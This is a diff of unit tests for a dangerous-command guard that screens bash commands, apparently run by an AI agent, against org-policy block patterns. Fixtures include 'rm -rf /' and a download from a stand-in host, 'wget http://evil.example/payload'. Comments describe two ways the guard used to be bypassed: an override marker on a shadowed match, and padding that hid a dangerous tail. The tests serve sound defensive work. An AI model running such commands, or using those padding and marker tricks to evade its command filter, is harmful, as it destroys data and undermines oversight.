@@ -1517,6 +1517,70 @@ describe('F3-3 org policy — integrated through evaluateDangerous', () => {
     const r = evaluateDangerous(policyBashCtx('rm -rf /'));
     expect(r?.kind).toBe('deny'); // 'off' rejected for project layer, built-in tier kept
   });
+
+  // P1-1: an org-ADDED pattern is appended AFTER the built-ins in the same category's list. The
+  // pre-fix code stopped at the first match in list order, so a laxer built-in `reconsider`
+  // match (checked first) "shadowed" a stricter org `block` match on the exact same string —
+  // and since `reconsider` honors the override marker, the command was silently ALLOWED despite
+  // an org policy that should have hard-blocked it unconditionally.
+  test('P1-1: an org "block"-tier pattern is not shadowed by an earlier-checked built-in "reconsider" match', () => {
+    fs.writeFileSync(projectPolicyPath, JSON.stringify({
+      patterns: { add: [{ id: 'org-rm-rf-block', regex: '\\brm\\s+-rf\\b', tier: 'block', reason: 'org-wide destructive rm block' }] },
+    }));
+    // `rm -rf build` also matches the built-in `rm-rf-recursive` (reconsider) — that match sits
+    // EARLIER in the bash pattern list than the org-added `block` pattern.
+    const r = evaluateDangerous(policyBashCtx('rm -rf build  # Rosetta-AI-reviewed'));
+    expect(r?.kind).toBe('deny');
+    const reason = (r as { kind: 'deny'; reason: string }).reason;
+    expect(reason).toContain('org-rm-rf-block');
+    expect(reason).toContain('cannot be overridden'); // block-tier message — marker was never even consulted
+  });
+
+  test('P1-1: without the org block pattern, the same command is only a built-in reconsider (marker still overrides it)', () => {
+    // Control case: with NO project policy at all, `rm -rf build` is the ordinary built-in
+    // reconsider match, and the marker legitimately overrides it — proves the fixture command
+    // itself isn't just always denied regardless of policy.
+    const r = evaluateDangerous(policyBashCtx('rm -rf build  # Rosetta-AI-reviewed'));
+    expect(r).toBeNull();
+  });
+
+  // P1-3: an org pattern is only tested against a bounded prefix of the candidate string. A
+  // long, harmless head (padding past that bound) used to hide a short, dangerous tail — the
+  // fix splits on shell segments and bounds each independently, so the tail is still seen.
+  test('P1-3: a dangerous segment past the length cap is no longer hidden behind a long harmless prefix', () => {
+    fs.writeFileSync(projectPolicyPath, JSON.stringify({
+      patterns: { add: [{ id: 'org-wget-block', regex: '\\bwget\\s', tier: 'reconsider', reason: 'org policy: no wget' }] },
+    }));
+    const command = `echo ${'a'.repeat(4000)}; wget http://evil.example/payload`;
+    const r = evaluateDangerous(policyBashCtx(command));
+    expect(r?.kind).toBe('deny');
+    expect((r as { kind: 'deny'; reason: string }).reason).toContain('org-wget-block');
+  });
+
+  test('P1-3: without the org pattern, the same padded command is safe (control case)', () => {
+    const command = `echo ${'a'.repeat(4000)}; wget http://evil.example/payload`;
+    expect(evaluateDangerous(policyBashCtx(command))).toBeNull();
+  });
+
+  test('P1-3: a single segment that itself exceeds the cap fails CLOSED (reconsider), not silently allowed', () => {
+    fs.writeFileSync(projectPolicyPath, JSON.stringify({
+      patterns: { add: [{ id: 'org-guard', regex: '\\bnuke\\b', tier: 'reconsider', reason: 'org guard pattern' }] },
+    }));
+    // One giant segment (no shell separators at all) well past the per-segment cap — the actual
+    // guard keyword ("nuke") never appears anywhere in it, so this can only be caught by the
+    // fail-closed path, not by an ordinary match.
+    const command = 'echo ' + 'a'.repeat(5000);
+    const r = evaluateDangerous(policyBashCtx(command));
+    expect(r?.kind).toBe('deny');
+    expect((r as { kind: 'deny'; reason: string }).reason).toContain('org-guard');
+  });
+
+  test('P1-3: a short command well under the cap is unaffected by the fail-closed guard', () => {
+    fs.writeFileSync(projectPolicyPath, JSON.stringify({
+      patterns: { add: [{ id: 'org-guard', regex: '\\bnuke\\b', tier: 'reconsider', reason: 'org guard pattern' }] },
+    }));
+    expect(evaluateDangerous(policyBashCtx('echo hello world'))).toBeNull();
+  });
 });
 
 describe('F3-4 audit trail — integrated through evaluateDangerous', () => {
